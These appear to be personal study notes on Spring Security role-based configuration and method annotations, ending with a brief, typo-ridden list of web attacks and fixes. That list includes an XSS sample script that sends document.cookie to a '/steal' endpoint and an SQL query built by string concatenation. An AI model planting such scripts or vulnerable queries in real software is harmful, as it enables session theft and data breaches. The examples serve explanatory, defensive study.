Basic Config:
--------------
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
	    .csrf(csrf -> csrf.disable())        // Disable CSRF for APIs
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS) // No sessions
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .requestMatchers("/user/**").hasAnyRole("USER", "ADMIN")
                .anyRequest().authenticated()
            )
            .httpBasic(); // formLogin(Customizer.withDefaults()); // enables login form
        
        return http.build();
    }
}

/public/** endpoints are open.
/admin/**	Only ADMIN users
/user/**	USER or ADMIN
.anyRequest().authenticated()	All other requests require authentication (logged-in users)
Basic Authentication (Authorization: Basic <base64> header) is used.

Security Annotations on Methods
-------------------------------
Now you can annotate your service/repository/controller methods.
Examples:

@PreAuthorize	Checks before method execution using SpEL (most powerful)
@PostAuthorize	Checks after method execution (rare but useful for some use cases)
@Secured	Checks roles before execution (simple, not SpEL)
@RolesAllowed	Like @Secured, from Jakarta EE, simple
@PostFilter     removes unauthorized items from the result list automatically. 

@Service
public class ProductService {

    @PreAuthorize("hasRole('ADMIN')")
    public void deleteProduct(Long productId) {
        // only ADMINs can delete products
    }

    @PreAuthorize("hasAnyRole('ADMIN', 'MANAGER')")
    public void updateProduct(Long productId, ProductDto productDto) {
        // ADMIN or MANAGER can update
    }

    @PreAuthorize("#userId == authentication.principal.id")
    public UserProfile getUserProfile(Long userId) {
        // a user can only see their own profile
    }
}

@Secured("ROLE_ADMIN")
public void deleteUser(Long userId) {
    // Only ADMIN can call this
}

@RolesAllowed({"ROLE_ADMIN", "ROLE_MANAGER"})
public void createOrder(Order order) {
    // Only ADMIN or MANAGER
}

@PostAuthorize("hasRole('ADMIN') or returnObject.owner == authentication.name")
public Document getDocument(Long docId) {
    return documentRepository.findById(docId)
        .orElseThrow(() -> new EntityNotFoundException("Document not found"));
}

returnObject = the object returned by the method (UserProfile here).
authentication.name = the current logged-in username.

@PostFilter("filterObject.owner == authentication.name")
public List<Document> getAllDocuments() {
    return documentRepository.findAll();
}



Security attacks and soln
=========================
1. CSRF(Cross site request forgery)
-> Browser manageed session to use authenticate other url.
-> Soln by csrf token

2. XSS(Cross site scripting)
-> add mlecisus script into webpage.
ex: <script>alert('Attack')</script>
    <script>
     fetch(http://localhost:8080/steal?cokkie=document.cockie);
    </script>
-> Used to still session
-> Soln Escaping user input and validating data properly.

3. CORS(Cross-origin Resource sharing) - Security features
-> Diifrent origin : Protocol + doamin + port
-> Soln by adding header (Access-Control-Allow-Origin)

4. SQL Injection
-> manupulate sql query by melecius input in user input field.
 Ex: select * from USer where name = '"+name+"'
